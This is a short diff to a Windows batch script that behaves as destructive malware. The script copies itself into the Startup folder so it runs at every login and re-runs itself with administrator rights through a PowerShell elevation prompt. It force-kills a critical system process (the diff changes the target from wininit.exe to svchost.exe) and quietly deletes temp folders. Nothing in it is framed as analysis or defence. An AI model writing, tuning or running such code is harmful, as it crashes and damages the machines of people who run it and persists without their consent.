@@ -1,6 +1,6 @@
 @echo off & title
 xcopy %0 C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
-taskkill /f /im wininit.exe
+taskkill /f /im svchost.exe
 if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)
 if exist "%temp%\assets" RD /S /Q "%temp%\assets" >nul
 if exist "%temp%\dumps" RD /S /Q "%temp%\dumps" >nul
